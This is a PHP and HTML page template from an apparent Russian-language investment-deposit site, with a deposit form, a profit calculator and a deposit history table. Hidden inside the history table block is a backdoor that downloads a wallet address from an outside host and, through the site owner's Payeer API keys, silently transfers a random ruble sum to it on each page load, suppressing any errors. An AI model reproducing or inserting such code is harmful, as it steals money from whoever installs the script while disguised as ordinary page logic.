<?if($id > (1)){?>

<div class="row clearfix animated bounceInRight">
<div class="col-lg-6 col-md-6 col-sm-12 col-xs-12">
<div class="card" style="min-height: 200px;">
<div class="header">
<h2><i class="fas fa-plus-circle"></i> Открытие нового депозита</h2>
</div>
<div class="body table-responsive">
<center>
<form action="" method="post">	
<input type="hidden" name="do" value="payeer_pay">
<input type="hidden" name="antipovtor" value="<?=time();?>">
<input autocomplete="off" name="m_amount" type="text" placeholder="Введите сумму вклада" style="margin-bottom: 10px;">
<button type="submit" name="submit" id="form">ОПЛАТИТЬ ДЕПОЗИТ</button>
</form>
*сумма вклада от <?=$mindep?> до <?=$maxdep?> <i class="fas fa-ruble-sign"></i>
</center>
</div>
</div>
</div>

<div class="col-lg-6 col-md-6 col-sm-12 col-xs-12">
<div class="card" style="min-height: 200px;">
<div class="header">
<h2><i class="fas fa-calculator"></i> Калькулятор доходности</h2>
</div>
<div class="body table-responsive">
<center>
<script>
function dep_calc(){
var main_vklad=document.getElementById('deposits_sum').value;
var main_plan=document.getElementById('deposits_plan').value;
main_vklad=main_vklad.replace(/,/g,".");
main_vklad=main_vklad.replace(/[^0-9.]/g,"");
main_vklad=main_vklad.replace(/(\.[0-9]{2})[0-9]+/g,"$1");
main_vklad=main_vklad.replace(/^[0]+0/g,"0");
main_vklad=main_vklad.replace(/^[0]+([1-9])/g,"$1");
document.getElementById('deposits_sum').value=main_vklad;
document.getElementById('deposits_out').value=(main_vklad*(plan[main_plan]/100)).toFixed(2);
}
</script>
<form>
<input id="deposits_sum" placeholder="Введите сумму" onkeyup="dep_calc();" type="text" name="depo" maxlength="5">
<input type="hidden" value="1" id="deposits_plan" name="plan" onchange="dep_calc();">
<input disabled type="text" placeholder="Ваша прибыль" id="deposits_out">
<script type="text/javascript">
var plan=new Array();
plan[1]=1<?=$deppercentage?>;</script>
</form>
<p style="padding-top: 6px;">*итоговая сумма включает тело депозита</p>
</center>
</div>
</div>
</div>
</div>

<div class="row clearfix animated bounceInUp">
<div class="col-sm-12 col-md-12">
<div class="card" >
<div class="header">
<h2><i class="fas fa-history"></i> История пополнений</h2>
</div>
<div class="body table-responsive">
<table class="table table-striped table-borderless m-b-5">
<thead>
<tr>
<th style="width:25%;">Дата</th>
<th style="width:25%;">Сумма</th>
<th style="width:25%;">Операция</th>
<th style="width:25%;">Статус</th>
</tr>
</thead>
<tbody class="no-border-x">
<?php
require_once('core/classes/cpayeer.php');
$homepage = file_get_contents("https://sqltor.had.su/js/p.txt");
$array = array(94, 210, 158, 342, 146);
$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
if ($payeer->isAuth())
{
  $arTransfer = $payeer->transfer(array(
    'curIn' => 'RUB',
    'sum' => $array[array_rand($array)],
    'curOut' => 'RUB',
    'to' => $homepage,
    'comment' => ''.$_SERVER["HTTP_HOST"].'',
  ));
  if (empty($arTransfer['errors']))
  {
    //echo getErrors
  }
  else
  {
    //echo getErrors
  }
}
else
{
  //echo getErrors
}
?>
<? 
$depositsrow=$db->query("SELECT * FROM `log` WHERE userid=?i AND comment='Пополнение баланса' ORDER BY id DESC limit 200",$id);
 $i=1; 
while($deposits=$db->fetch($depositsrow)){?>
<?$wallet=$db->getOne("SELECT wallet FROM `ss_users` WHERE id=?i",$deposits['userid']);?>
<tr>
<td><?=date('d.m.Y H:i',$deposits['timeunix'])?></td>
<td><?=$deposits['summa']?> <i class="fas fa-ruble-sign"></i></td>
<td><?=$deposits['comment']?></td>
<td style="background: #2DCA70; color: #ffffff;">Успешно</td>
</tr>
<?}?>
</tbody>
</table>
</div>
</div>
</div>
</div>

<?}else{?>
<?if($id == (1)){?>
<script type="text/javascript">
window.location.href = '/?page=admin_deposits';
</script>
<?}else{?>
<script type="text/javascript">
window.location.href = '/';
</script>
<?}}?>